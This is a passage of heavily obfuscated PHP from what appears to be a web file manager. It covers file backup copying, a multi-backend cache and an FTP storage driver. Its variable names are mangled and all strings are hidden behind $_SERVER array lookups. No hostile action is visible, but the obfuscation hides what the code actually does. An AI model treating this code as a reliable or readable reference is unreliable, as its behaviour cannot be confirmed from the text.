Model($¼ù—ß²–[854])->get($¼ù—ß²–[855]); $ÜŸÇÌëÆ = substr(md5($¼ù—ß²–[856] . $·ÙÈ¤Ò˜ . $„°Îè×ƒ), 0, 8); return "\x7b\x69\x6f\72{$ºù»¸¢­[$¼ù—ß²–[836]]}\x7d\x2f\144\141\164\141\x62\141\x73\145\57\x62\141\x63\x6b\165\160\x2f" . $„°Îè×ƒ . $¼ù—ß²–[11] . $ÜŸÇÌëÆ; } private function tmpFilesPath() { $§®õ…üŠ =& $_SERVER[«òÑğ]; $òò°•¹ = TEMP_FILES; if ($GLOBALS[$§®õ…üŠ[6]][$§®õ…üŠ[92]][$§®õ…üŠ[882]]) { $òò°•¹ = $GLOBALS[$§®õ…üŠ[6]][$§®õ…üŠ[92]][$§®õ…üŠ[882]]; if (!mk_dir($òò°•¹) || !is_writable($òò°•¹) || !IO::mkfile($òò°•¹ . $§®õ…üŠ[883])) { $òò°•¹ = TEMP_FILES; } } return $òò°•¹; } } class BackupFile { public function __construct() { } public function index() { $äøèî· = Backup::get(); $øÂºŠì = $äøèî·[$_SERVER[«òÑğ][371]][$_SERVER[«òÑğ][233]][$_SERVER[«òÑğ][546]]; $§õÃ„Š¦ = array($_SERVER[«òÑğ][547] => array($_SERVER[«òÑğ][896], $øÂºŠì), $_SERVER[«òÑğ][897] => array($_SERVER[«òÑğ][409], $äøèî·[$_SERVER[«òÑğ][836]])); $Æ½Ú‹¤— = (int) Model($_SERVER[«òÑğ][875])->where($§õÃ„Š¦)->count($_SERVER[«òÑğ][546]); $ú‚‰’üá = (int) Model($_SERVER[«òÑğ][875])->where($§õÃ„Š¦)->sum($_SERVER[«òÑğ][79]); $ŸĞüÏÓ = new TaskFileTransfer($_SERVER[«òÑğ][898], $_SERVER[«òÑğ][861], $Æ½Ú‹¤—, LNG($_SERVER[«òÑğ][870]) . $_SERVER[«òÑğ][871] . LNG($_SERVER[«òÑğ][899])); $ŸĞüÏÓ->task[$_SERVER[«òÑğ][847]] = $ú‚‰’üá; $ü—ò¬ÚÁ = array($_SERVER[«òÑğ][900] => $Æ½Ú‹¤—, $_SERVER[«òÑğ][901] => $ú‚‰’üá, $_SERVER[«òÑğ][902] => time()); Backup::set($ü—ò¬ÚÁ); $áäµ = !0; $¡ôÌ¦ÇØ = $this->storeIds(); $ä¿»Öº£ = 1; $ª›”” = 1000; $àıÉÖ = $ùƒõøá¢ = 0; $ğ£¾„Â = array(); $¼‹–Çí¹ = $íÂıÀ×¹ = 0; do { $øüÎŞ”· = $_SERVER[«òÑğ][903]; $Ìé·šã = Model($_SERVER[«òÑğ][875])->where($§õÃ„Š¦)->field($øüÎŞ”·)->order($_SERVER[«òÑğ][904])->selectPage($ª›””, $ä¿»Öº£); $ÄÆ’˜î• = !empty($Ìé·šã[$_SERVER[«òÑğ][448]]) ? $Ìé·šã[$_SERVER[«òÑğ][448]] : array(); foreach ($ÄÆ’˜î• as $’­ßßŒ„) { if (!$this->_fileExist($’­ßßŒ„, $ğ£¾„Â, $¡ôÌ¦ÇØ)) { Backup::log($_SERVER[«òÑğ][905] . $’­ßßŒ„[$_SERVER[«òÑğ][546]] . $_SERVER[«òÑğ][906] . $’­ßßŒ„[$_SERVER[«òÑğ][87]]); continue; } $„­ÂºÙä = $’­ßßŒ„[$_SERVER[«òÑğ][87]]; $ñıÉ°é = "\x7b\x69\157\x3a{$äøèî·[$_SERVER[«òÑğ][836]]}\175" . substr($„­ÂºÙä, strlen("\x7b\151\157\72{$’­ßßŒ„[$_SERVER[«òÑğ][907]]}\x7d")); if (IO::exist($ñıÉ°é)) { $ŸĞüÏÓ->updateFileEnd($’­ßßŒ„[$_SERVER[«òÑğ][32]], $’­ßßŒ„[$_SERVER[«òÑğ][79]]); } else { $ñıÉ°é = get_path_father($ñıÉ°é); IO::mkdir($ñıÉ°é); if (!IO::copy($„­ÂºÙä, $ñıÉ°é, $_SERVER[«òÑğ][908])) { Backup::log($_SERVER[«òÑğ][909] . $„­ÂºÙä . $_SERVER[«òÑğ][891] . $ñıÉ°é . $_SERVER[«òÑğ][178]); $áäµ = !1; break; } } $øÂºŠì = $’­ßßŒ„[$_SERVER[«òÑğ][546]]; $ùƒõøá¢ += 1; $àıÉÖ += $’­ßßŒ„[$_SERVER[«òÑğ][79]]; $íÂıÀ×¹ += 1; $¼‹–Çí¹ += $’­ßßŒ„[$_SERVER[«òÑğ][79]]; if ($àıÉÖ >= 1024 * 1024 * 100) { $ü—ò¬ÚÁ = array($_SERVER[«òÑğ][835] => $øÂºŠì, $_SERVER[«òÑğ][910] => $íÂıÀ×¹, $_SERVER[«òÑğ][911] => $¼‹–Çí¹); Backup::set($ü—ò¬ÚÁ); $àıÉÖ = $ùƒõøá¢ = 0; } } $ößÉšÁ€ = count($ÄÆ’˜î•); $ä¿»Öº£++; } while ($ößÉšÁ€ == $ª›””); $ŸĞüÏÓ->end(); $ü—ò¬ÚÁ = array($_SERVER[«òÑğ][912] => 1, $_SERVER[«òÑğ][845] => time(), $_SERVER[«òÑğ][859] => 1, $_SERVER[«òÑğ][835] => $øÂºŠì, $_SERVER[«òÑğ][913] => time()); if ($ùƒõøá¢) { $ü—ò¬ÚÁ[$_SERVER[«òÑğ][910]] = $íÂıÀ×¹; $ü—ò¬ÚÁ[$_SERVER[«òÑğ][911]] = $¼‹–Çí¹; } Backup::set($ü—ò¬ÚÁ); return !0; } private function _fileExist($úÏì „õ, &$¹º“©Õ‚, $ùìˆ·¬æ) { $†ç ¤àú =& $_SERVER[«òÑğ]; $ÏÙ¨œîü = $úÏì „õ[$†ç ¤àú[87]]; if (in_array($úÏì „õ[$†ç ¤àú[546]], $¹º“©Õ‚)) { return !1; } if (!in_array($úÏì „õ[$†ç ¤àú[907]], $ùìˆ·¬æ)) { return !1; } if (IO::exist($ÏÙ¨œîü)) { return !0; } $Ø×—‡ò = get_path_father($ÏÙ¨œîü); if (IO::exist($Ø×—‡ò)) { $¹º“©Õ‚[] = $úÏì „õ[$†ç ¤àú[546]]; return !1; } $´¡Àø¾è = array($†ç ¤àú[907] => $úÏì „õ[$†ç ¤àú[907]], $†ç ¤àú[87] => array($†ç ¤àú[462], "{$Ø×—‡ò}\x25")); $´„¾‰º› = Model($†ç ¤àú[875])->where($´¡Àø¾è)->field($†ç ¤àú[547])->select(); $¹º“©Õ‚ = array_merge($¹º“©Õ‚, array_to_keyvalue($´„¾‰º›, $†ç ¤àú[12], $†ç ¤àú[546])); return !1; } private function _fileFilter($ä‚–Ï) { $­ÇÂÕìØ =& $_SERVER[«òÑğ]; return; if (empty($ä‚–Ï)) { return; } $ÕÀÃ ‚¨ = array($­ÇÂÕìØ[546] => array($­ÇÂÕìØ[7], array_unique($ä‚–Ï))); $†…îù˜º = Model($­ÇÂÕìØ[914])->where($ÕÀÃ ‚¨)->field($­ÇÂÕìØ[194])->select(); foreach ($†…îù˜º as $ìŸ€°£º) { Model($­ÇÂÕìØ[914])->remove($ìŸ€°£º[$­ÇÂÕìØ[194]], !1); } } private function storeIds() { $Ğëºäë =& $_SERVER[«òÑğ]; $úîá· = Model($Ğëºäë[851])->listData(); $˜³å˜ï° = array(); $Ş« ¼Â¡ = $GLOBALS[$Ğëºäë[6]][$Ğëºäë[92]][$Ğëºäë[915]]; foreach ($úîá· as $Ïáİ„Ùƒ) { $ñ×¯ßÒ¹ = strtolower($Ïáİ„Ùƒ[$Ğëºäë[98]]); if (!isset($Ş« ¼Â¡[$ñ×¯ßÒ¹])) { continue; } $®öª’†® = $Ğëºäë[77] . (isset($Ş« ¼Â¡[$ñ×¯ßÒ¹]) ? $Ş« ¼Â¡[$ñ×¯ßÒ¹] : ucfirst($ñ×¯ßÒ¹)); if (!class_exists($®öª’†®)) { continue; } $˜³å˜ï°[] = $Ïáİ„Ùƒ[$Ğëºäë[478]]; } return $˜³å˜ï°; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¬×¾ŸÏ =& $_SERVER[«òÑğ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ÅÃåµ†Ö = $GLOBALS[$¬×¾ŸÏ[6]][$¬×¾ŸÏ[427]]; $İñÙÌÑò = $ÅÃåµ†Ö[$ÅÃåµ†Ö[$¬×¾ŸÏ[916]]]; $¶‚¿”…‡ = $ÅÃåµ†Ö[$¬×¾ŸÏ[917]]; switch ($ÅÃåµ†Ö[$¬×¾ŸÏ[916]]) { case $¬×¾ŸÏ[21]: self::$handle = Model($¬×¾ŸÏ[918]); break; case $¬×¾ŸÏ[919]: self::$handle = new CacheRedis($İñÙÌÑò, $¶‚¿”…‡); break; case $¬×¾ŸÏ[920]: self::$handle = new CacheMemcached($İñÙÌÑò, $¶‚¿”…‡); break; case $¬×¾ŸÏ[233]: self::$handle = new CacheFile($İñÙÌÑò, $¶‚¿”…‡); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($°ô¹·””) { if (is_array($°ô¹·””) || is_object($°ô¹·””)) { $°ô¹·”” = json_encode($°ô¹·””); } $°ô¹·”” = rawurlencode($°ô¹·””); return md5(KOD_SITE_ID . $_SERVER[«òÑğ][11] . $°ô¹·””); } public static function get($¿Ò»®ÑÃ, $ÈûüÔÛê = false) { $…Ç«í«ó = self::key($¿Ò»®ÑÃ); $õéÄøÅè = self::init(); if ($ÈûüÔÛê) { return unserialize($õéÄøÅè->get($…Ç«í«ó)); } if (!isset(self::$memoryCache[$…Ç«í«ó])) { $û„í‰îâ = $õéÄøÅè->get($…Ç«í«ó); self::$memoryCache[$…Ç«í«ó] = unserialize($û„í‰îâ); } return self::$memoryCache[$…Ç«í«ó]; } public static function set($‹¿¤Øéî, $îƒ’£¡ê, $Œù­Œ•Ï = false) { $‹ÄĞ»Ë =& $_SERVER[«òÑğ]; $ÖÚÉ‚¿è = self::key($‹¿¤Øéî); if (isset(self::$memoryCache[$ÖÚÉ‚¿è]) && self::$memoryCache[$ÖÚÉ‚¿è] === $îƒ’£¡ê) { return !0; } if ($Œù­Œ•Ï === 0) { self::$memoryCache[$ÖÚÉ‚¿è] = $îƒ’£¡ê; return !0; } $Ğì•Èéè = self::init(); $••ÅäàÖ = serialize($îƒ’£¡ê); CacheLock::lock($‹¿¤Øéî . $‹ÄĞ»Ë[921]); $ĞŸÖÛ« = $Ğì•Èéè->set($ÖÚÉ‚¿è, $••ÅäàÖ, $Œù­Œ•Ï); self::$memoryCache[$ÖÚÉ‚¿è] = $îƒ’£¡ê; CacheLock::unlock($‹¿¤Øéî . $‹ÄĞ»Ë[921]); return $ĞŸÖÛ«; } public static function getCall($ò²èäÀ, $®äè¿œ×, $ÂË§•–¶, $¡îåò¥š = array()) { $³‡öÔ‡ =& $_SERVER[«òÑğ]; $§ÇÆ´Ã¬ = self::get($ò²èäÀ); if ($§ÇÆ´Ã¬ || $§ÇÆ´Ã¬ === $³‡öÔ‡[12]) { return $§ÇÆ´Ã¬; } $§ÇÆ´Ã¬ = call_user_func_array($ÂË§•–¶, $¡îåò¥š); $§ÇÆ´Ã¬ = $§ÇÆ´Ã¬ ? $§ÇÆ´Ã¬ : $³‡öÔ‡[12]; self::set($ò²èäÀ, $§ÇÆ´Ã¬, $®äè¿œ×); return $§ÇÆ´Ã¬; } public static function remove($ûƒÌà¨) { $ğí„Ş´¹ = self::key($ûƒÌà¨); unset(self::$memoryCache[$ğí„Ş´¹]); self::clearTimeout(); CacheLock::lock($ûƒÌà¨); $Ë›ö´Ã¹ = self::init()->remove($ğí„Ş´¹); CacheLock::unlock($ûƒÌà¨); return $Ë›ö´Ã¹; } public static function removeMemory($ĞÀÑ§¦§) { $®²‹§Ç = self::key($ĞÀÑ§¦§); unset(self::$memoryCache[$®²‹§Ç]); } public static function clearMemory($‹—ã£ù = false) { if ($‹—ã£ù) { $‹—ã£ù = self::key($‹—ã£ù); unset(self::$memoryCache[$‹—ã£ù]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[«òÑğ][922])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[«òÑğ][923])) { self::init()->clearTimeout(); } } } goto aàŞÂØŒ‘¥; ešÉ“ô¡î«: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($ÎÉúìƒÄ) { parent::__construct(); if (count($ÎÉúìƒÄ) > 0) { $this->_init($ÎÉúìƒÄ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ş¶›£šâ) { $öëñƒ«Û =& $_SERVER[«òÑğ]; global $config; $this->appCharset = $config[$öëñƒ«Û[1450]]; $this->systemCharset = $config[$öëñƒ«Û[1451]]; if (isset($ş¶›£šâ[$öëñƒ«Û[1452]]) && $ş¶›£šâ[$öëñƒ«Û[1452]]) { $this->systemCharset = $ş¶›£šâ[$öëñƒ«Û[1452]]; } } public function iconvApp($ß˜¢°·) { return $this->iconvTo($ß˜¢°·, $this->systemCharset, $this->appCharset); } public function iconvSystem($­®¡ÒøÇ) { return $this->iconvTo($­®¡ÒøÇ, $this->appCharset, $this->systemCharset); } public function getPathOuter($ë‹îó›©) { $€Âó¦¢£ =& $_SERVER[«òÑğ]; $´•ÚªĞ = $this->iconvApp($this->pathBase); $ë‹îó›© = $this->iconvApp($ë‹îó›©); if (substr($´•ÚªĞ, 0, 2) == $€Âó¦¢£[1421]) { $´•ÚªĞ = BASIC_PATH . substr($´•ÚªĞ, 2); } if (substr($ë‹îó›©, 0, 2) == $€Âó¦¢£[1421]) { $ë‹îó›© = BASIC_PATH . substr($ë‹îó›©, 2); } $´•ÚªĞ = KodIO::clear($´•ÚªĞ); $ë‹îó›© = KodIO::clear($ë‹îó›©); $ë‹îó›© = substr($ë‹îó›©, strlen($´•ÚªĞ)); if (empty($this->pathDriver)) { return $ë‹îó›©; } return $this->pathDriver . $€Âó¦¢£[8] . ltrim($ë‹îó›©, $€Âó¦¢£[8]); } private function _init($¢Åù“ğá = array()) { $ÏÉÁİà² =& $_SERVER[«òÑğ]; if (!function_exists($ÏÉÁİà²[1453])) { throw new Exception(LNG($ÏÉÁİà²[1454])); } $this->config = $¢Åù“ğá; $this->charsetReset($¢Åù“ğá); foreach ($¢Åù“ğá as $ª†ıÛ„¥ => $ÈôÊ¦Ó²) { if (isset($this->{$ª†ıÛ„¥})) { $this->{$ª†ıÛ„¥} = $ÈôÊ¦Ó²; } } return $this->_login($¢Åù“ğá); } private function _login($—Ø¦‰ô×) { $…Üà“¼ =& $_SERVER[«òÑğ]; static $øáµÄá® = array(); $›Å­¿å÷ = md5(json_encode($—Ø¦‰ô×)); if (isset($øáµÄá®[$›Å­¿å÷])) { foreach ($øáµÄá®[$›Å­¿å÷] as $½ø¥äïá => $ôÉİÜÚ†) { $this->{$½ø¥äïá} = $ôÉİÜÚ†; } return !0; } $äÍ±îº = parse_url(trim($this->server, $…Üà“¼[8])); $this->host = $äÍ±îº[$…Üà“¼[209]]; $ãÏ§Ì‚ = isset($äÍ±îº[$…Üà“¼[208]]) && $äÍ±îº[$…Üà“¼[208]] == $…Üà“¼[1455] ? !0 : !1; $this->scheme = $ãÏ§Ì‚ ? $…Üà“¼[1456] : $…Üà“¼[1457]; $this->port = isset($äÍ±îº[$…Üà“¼[210]]) ? $äÍ±îº[$…Üà“¼[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($…Üà“¼[1458]) . $this->host . $…Üà“¼[4] . $this->port, !0); return !1; } $¤Íî×’î = @ftp_login($this->connect, $this->username, $this->userpass); if (!$¤Íî×’î) { $this->writeLog(LNG($…Üà“¼[1459]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $…Üà“¼[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Õ·¸­È… = $this->pasv == $…Üà“¼[91] ? !0 : !1; @ftp_pasv($this->connect, $Õ·¸­È…); $øáµÄá®[$›Å­¿å÷] = array($…Üà“¼[1460] => $this->connect, $…Üà“¼[209] => $this->host, $…Üà“¼[208] => $this->scheme, $…Üà“¼[210] => $this->port); return $¤Íî×’î; } private function _isconn($†Ş–Š¿  = true) { if (is_resource($this->connect)) { return !0; } if (!$†Ş–Š¿ ) { return !1; } return $this->_login($this->config); } public function mkfile($ƒ³Ã»ôî, $·ıŞ®å® = '', $ş¾™’´Ÿ = REPEAT_RENAME) { if ($this->setContent($ƒ³Ã»ôî, $·ıŞ®å®)) { return $this->getPathOuter($ƒ³Ã»ôî); } $this->writeLog(LNG($_SERVER[«òÑğ][1461]), !0); return !1; } public function mkdir($ë††äÜ, $ßé¶ó» = REPEAT_SKIP) { $†•Û•×Ä =& $_SERVER[«òÑğ]; if (!$ë††äÜ || $ë††äÜ == $†•Û•×Ä[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ë††äÜ = $this->iconvSystem($ë††äÜ); if ($this->_isFolder($ë††äÜ) || @ftp_mkdir($this->connect, $ë††äÜ)) { return $this->getPathOuter($ë††äÜ); } if (!$this->mkdir($this->pathFather($ë††äÜ))) { return !1; } if ($ë††äÜ = @ftp_mkdir($this->connect, $ë††äÜ)) { return $this->getPathOuter($ë††äÜ); } $ç§—ö¸Û = __FUNCTION__ . $†•Û•×Ä[1462]; $this->writeLog($ç§—ö¸Û, !0); return !1; } public function copyFile($Æ€Äµ«, $ÀøƒÌÁà) { if (!$this->_isconn()) { return !1; } $ùîÜ½ÏË = $this->pathThis($this->iconvSystem($Æ€Äµ«)); $èÑ’øÎˆ = $this->tempFile($ùîÜ½ÏË); $¯ùèš¬¡ = $this->iconvApp($èÑ’øÎˆ); $this->download($Æ€Äµ«, $¯ùèš¬¡); $«€·’±½ = $this->upload($ÀøƒÌÁà, $¯ùèš¬¡); $this->tempFileRemve($èÑ’øÎˆ); return $«€·’±½; } public function moveFile($¸Î„é÷‘, $ß¸ä ) { if (!$this->_isconn()) { return !1; } $¸Î„é÷‘ = $this->iconvSystem($¸Î„é÷‘); $ß¸ä  = $this->iconvSystem($ß¸ä ); $šõÂÓÅ = @ftp_rename($this->connect, $¸Î„é÷‘, $ß¸ä ); if (!$šõÂÓÅ) { $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][1462], !0); return !1; } return $this->getPathOuter($ß¸ä ); } public function delFile($ä¡×²áŠ) { if (!$this->_isconn()) { return !1; } $ä¡×²áŠ = $this->iconvSystem($ä¡×²áŠ); $ĞÓ¥øĞ‚ = @ftp_delete($this->connect, $ä¡×²áŠ); if (!$ĞÓ¥øĞ‚) { $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][1462], !0); } return $ĞÓ¥øĞ‚; } public function delFolder($â˜Ì‘í£) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ùÚÔ‰ÜÚ = $ÆÅÉŞ¼® = array(); $this->fileList($â˜Ì‘í£, $ùÚÔ‰ÜÚ, $ÆÅÉŞ¼®, !0); $this->listItemCache = !0; foreach ($ÆÅÉŞ¼® as $à€ ›ù¸) { $Ì¾µ™Ø¶ = $this->iconvSystem($à€ ›ù¸[$_SERVER[«òÑğ][32]]); $‹½ˆ„Î“ = @ftp_delete($this->connect, $Ì¾µ™Ø¶); if (!$‹½ˆ„Î“) { return !1; } } foreach ($ùÚÔ‰ÜÚ as $Ì¾µ™Ø¶) { $Ì¾µ™Ø¶ = $this->iconvSystem($Ì¾µ™Ø¶); $‹½ˆ„Î“ = @ftp_rmdir($this->connect, $Ì¾µ™Ø¶); if (!$‹½ˆ„Î“) { return !1; } } $â˜Ì‘í£ = $this->iconvSystem($â˜Ì‘í£); return @ftp_rmdir($this->connect, $â˜Ì‘í£); } public function rename($ôÔîĞßø, $ƒ¹¢õúÃ) { $÷•—åö =& $_SERVER[«òÑğ]; if (!$this->_isconn()) { return !1; } $Á‰û«²š = $this->fileNameAuto($this->pathFather($ôÔîĞßø), $ƒ¹¢õúÃ); $Á‰û«²š = $this->iconvSystem($Á‰û«²š); $ôÔîĞßø = $this->iconvSystem($ôÔîĞßø); $ûÙ˜Âé = $this->pathFather($ôÔîĞßø); $š¤İø  = rtrim($ûÙ˜Âé, $÷•—åö[8]) . $÷•—åö[8] . $Á‰û«²š; $„´‰®‰ = @ftp_rename($this->connect, $ôÔîĞßø, $š¤İø ); if (!$„´‰®‰) { $this->writeLog(__FUNCTION__ . $÷•—åö[1462], !0); return !1; } $š¤İø  = $this->iconvApp($š¤İø ); return $this->getPathOuter($š¤İø ); } private function folderInfo($«‘ú·¿, $ıÒïŸÇ« = false) { $ØşÇ­ò =& $_SERVER[«òÑğ]; $¹“Ä×ËÄ = array($ØşÇ­ò[32] => $this->pathThis($«‘ú·¿), $ØşÇ­ò[87] => $this->getPathOuter($ØşÇ­ò[8] . $«‘ú·¿), $ØşÇ­ò[33] => $ØşÇ­ò[78]); if ($ıÒïŸÇ«) { return $¹“Ä×ËÄ; } $¹“Ä×ËÄ[$ØşÇ­ò[234]] = $¹“Ä×ËÄ[$ØşÇ­ò[88]] = 0; $¹“Ä×ËÄ[$ØşÇ­ò[235]] = $¹“Ä×ËÄ[$ØşÇ­ò[236]] = !0; return $¹“Ä×ËÄ; } private function fileInfo($“Àèª²æ, $«ÓŠÌÁÉ = false, $¨·³Ãº³ = array()) { $Ù”™óÅÙ =& $_SERVER[«òÑğ]; $Õ°´ ®Ù = array($Ù”™óÅÙ[32] => $this->pathThis($“Àèª²æ), $Ù”™óÅÙ[87] => $this->getPathOuter($Ù”™óÅÙ[8] . $“Àèª²æ), $Ù”™óÅÙ[33] => $Ù”™óÅÙ[233], $Ù”™óÅÙ[79] => isset($¨·³Ãº³[$Ù”™óÅÙ[79]]) ? $¨·³Ãº³[$Ù”™óÅÙ[79]] : 0, $Ù”™óÅÙ[169] => $this->ext($“Àèª²æ)); if ($«ÓŠÌÁÉ) { return $Õ°´ ®Ù; } $Õ°´ ®Ù[$Ù”™óÅÙ[234]] = $Õ°´ ®Ù[$Ù”™óÅÙ[88]] = 0; $Õ°´ ®Ù[$Ù”™óÅÙ[235]] = $Õ°´ ®Ù[$Ù”™óÅÙ[236]] = !0; $¥ĞœÖÚ = $this->iconvSystem($“Àèª²æ); $Õ°´ ®Ù[$Ù”™óÅÙ[88]] = @ftp_mdtm($this->connect, $¥ĞœÖÚ); if (empty($¨·³Ãº³)) { $¨·³Ãº³ = $this->objectMeta($“Àèª²æ); if (!$¨·³Ãº³) { return $Õ°´ ®Ù; } } $Õ°´ ®Ù[$Ù”™óÅÙ[79]] = $¨·³Ãº³[$Ù”™óÅÙ[79]]; return $Õ°´ ®Ù; } public function size($ı­ñšÒ) { $¯ç¨Ş×Ù = $this->objectMeta($ı­ñšÒ); return $¯ç¨Ş×Ù ? $¯ç¨Ş×Ù[$_SERVER[«òÑğ][79]] : 0; } public function info($ÌÈ¨ÜÅÏ) { if ($this->isFile($ÌÈ¨ÜÅÏ)) { return $this->fileInfo($ÌÈ¨ÜÅÏ, 0); } else { if ($this->isFolder($ÌÈ¨ÜÅÏ)) { return $this->folderInfo($ÌÈ¨ÜÅÏ); } } return !1; } private function fileList($•ıœÆ¦Ğ, &$ø×Ñ·ë•, &$ôÎÖı€ä, $¡…±Š’ = false) { $áéïù¤  =& $_SERVER[«òÑğ]; $•ıœÆ¦Ğ = $this->iconvSystem($•ıœÆ¦Ğ); if (!$this->isFolder($•ıœÆ¦Ğ)) { return !1; } $•ıœÆ¦Ğ = rtrim($•ıœÆ¦Ğ, $áéïù¤ [8]) . $áéïù¤ [8]; check_abort(); $„¤¸«Äà = @ftp_rawlist($this->connect, $•ıœÆ¦Ğ); if (!$„¤¸«Äà) { $„¤¸«Äà = array(); } $íÛÂıæ‰ = array($áéïù¤ [10] => 1, $áéïù¤ [1373] => 1); foreach ($„¤¸«Äà as $ ®Ì™Å˜) { $é“œŞ = $this->_listItem($ ®Ì™Å˜); if ($é“œŞ[0] == $áéïù¤ [842]) { continue; } $ûÔˆü—Ö = $é“œŞ[8]; if (empty($ûÔˆü—Ö) && $ûÔˆü—Ö !== $áéïù¤ [231] || isset($íÛÂıæ‰[$ûÔˆü—Ö])) { continue; } $ûÔˆü—Ö = $this->iconvApp($•ıœÆ¦Ğ . ltrim($ûÔˆü—Ö, $áéïù¤ [8])); $™üÀÛ“ô = array($áéïù¤ [32] => $ûÔˆü—Ö, $áéïù¤ [33] => $áéïù¤ [233], $áéïù¤ [79] => $é“œŞ[4]); if (substr($ ®Ì™Å˜, 0, 1) == $áéïù¤ [1463]) { $™üÀÛ“ô[$áéïù¤ [33]] = $áéïù¤ [78]; $™üÀÛ“ô[$áéïù¤ [79]] = 0; } $«ÔŠÊğ• = $™üÀÛ“ô[$áéïù¤ [33]] == $áéïù¤ [78] ? !0 : !1; $this->cacheMethodInfoSet($ûÔˆü—Ö, $«ÔŠÊğ•, $™üÀÛ“ô); if ($«ÔŠÊğ•) { $ø×Ñ·ë•[] = $ûÔˆü—Ö; if ($¡…±Š’) { $this->fileList($ûÔˆü—Ö, $ø×Ñ·ë•, $ôÎÖı€ä, $¡…±Š’); } continue; } $ôÎÖı€ä[] = $™üÀÛ“ô; } $this->cacheMethodInfoSet($•ıœÆ¦Ğ, !0); } private function _listItem($¶ùÏùİ¼) { if (empty($¶ùÏùİ¼)) { return array(); } $î´úäˆœ = preg_split($_SERVER[«òÑğ][1464], $¶ùÏùİ¼); if (count($î´úäˆœ) <= 9) { return $î´úäˆœ; } $î´úäˆœ[8] = trim(substr($¶ùÏùİ¼, strpos($¶ùÏùİ¼, $î´úäˆœ[7]) + strlen($î´úäˆœ[7]))); return array_splice($î´úäˆœ, 0, 9); } public function listPath($åñ«à‹Ò, $ —Ÿ•ıè = false) { $‘©ìşÀû =& $_SERVER[«òÑğ]; if (!$this->_isconn()) { return !1; } $éÑäíæ¯ = $¬ëŠñ‘µ = array(); $this->fileList($åñ«à‹Ò, $éÑäíæ¯, $¬ëŠñ‘µ); foreach ($éÑäíæ¯ as $«üùşŒ¶ => $ÈŒ¨ºÅ”) { $éÑäíæ¯[$«üùşŒ¶] = $this->folderInfo($ÈŒ¨ºÅ”, $ —Ÿ•ıè); } foreach ($¬ëŠñ‘µ as $«üùşŒ¶ => $ÈŒ¨ºÅ”) { $¬ëŠñ‘µ[$«üùşŒ¶] = $this->fileInfo($ÈŒ¨ºÅ”[$‘©ìşÀû[32]], $ —Ÿ•ıè, $ÈŒ¨ºÅ”); } return array($‘©ìşÀû[85] => $éÑäíæ¯, $‘©ìşÀû[86] => $¬ëŠñ‘µ); } public function has($‚Š™¥‚, $­«À÷®’ = false, $¬›˜ö‚Ì = true) { $Í«—ÓğÁ =& $_SERVER[«òÑğ]; $±°–ÊÂ = $ ”õæ º = array(); $Ã³£ä‚ = $­«À÷®’ ? !0 : !1; $this->fileList($‚Š™¥‚, $±°–ÊÂ, $ ”õæ º, $Ã³£ä‚); if ($­«À÷®’) { return array($Í«—ÓğÁ[242] => count($ ”õæ º), $Í«—ÓğÁ[243] => count($±°–ÊÂ)); } if ($¬›˜ö‚Ì) { if (count($ ”õæ º)) { return !0; } } else { if (count($±°–ÊÂ)) { return !0; } } return !1; } public function listAll($¢³ÊİíĞ) { $ëëŞ‚Èƒ =& $_SERVER[«òÑğ]; if (!$this->_isconn()) { return !1; } $ÒÍ‡±¸ = $¯šüšê = array(); $this->fileList($¢³ÊİíĞ, $ÒÍ‡±¸, $¯šüšê, !0); $Ë¤¸Åšà = array_to_keyvalue($¯šüšê, $ëëŞ‚Èƒ[32]); foreach ($ÒÍ‡±¸ as $ìŠ×÷Ğ) { if (is_string($ìŠ×÷Ğ)) { $Ë¤¸Åšà[$ìŠ×÷Ğ] = array($ëëŞ‚Èƒ[79] => 0); } } return $this->listAllFiles($¢³ÊİíĞ, $Ë¤¸Åšà); } public function getContent($ÏĞ´²§Ó) { if (!$this->_isconn()) { return !1; } $ÏĞ´²§Ó = $this->iconvSystem($ÏĞ´²§Ó); return $this->fileSubstr($ÏĞ´²§Ó); } public function setContent($¯¹ÛÍáÂ, $ôÃŸí¸î = '') { if (!$this->_isconn()) { return !1; } $À•ñÄ³ = $this->pathThis($this->iconvSystem($¯¹ÛÍáÂ)); $Í„“çÊä = $this->tempFile($À•ñÄ³); file_put_contents($Í„“çÊä, $ôÃŸí¸î); $ú“Œ¾Îì = $this->upload($¯¹ÛÍáÂ, $this->iconvApp($Í„“çÊä)); $this->tempFileRemve($Í„“çÊä); return $ú“Œ¾Îì; } public function fileSubstr($÷ÔŠÛûì, $¡Ğ§ß”è = 0, $ã»ÑãõÛ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($÷ÔŠÛûì, $¡Ğ§ß”è, $ã»ÑãõÛ); } private function ftpRequest($Ş¾Í¡öæ, $£ì•¨ñ° = 0, $—¸‹º Ñ = false) { $ıŸØöÅû =& $_SERVER[«òÑğ]; $Ş¾Í¡öæ = $ıŸØöÅû[8] . ltrim(str_ltrim($Ş¾Í¡öæ, $this->ftpPath), $ıŸØöÅû[8]); $Ş¾Í¡öæ = $this->iconvSystem($Ş¾Í¡öæ); $–ÁÒ™¶ = $this->scheme . $this->host . $ıŸØöÅû[4] . $this->port; $ÒôÛãÈ = curl_init(); curl_setopt($ÒôÛãÈ, CURLOPT_URL, $–ÁÒ™¶ . $this->pathEncode($Ş¾Í¡öæ)); curl_setopt($ÒôÛãÈ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($—¸‹º Ñ) { $–ÚäÖ“ï = $£ì•¨ñ° + 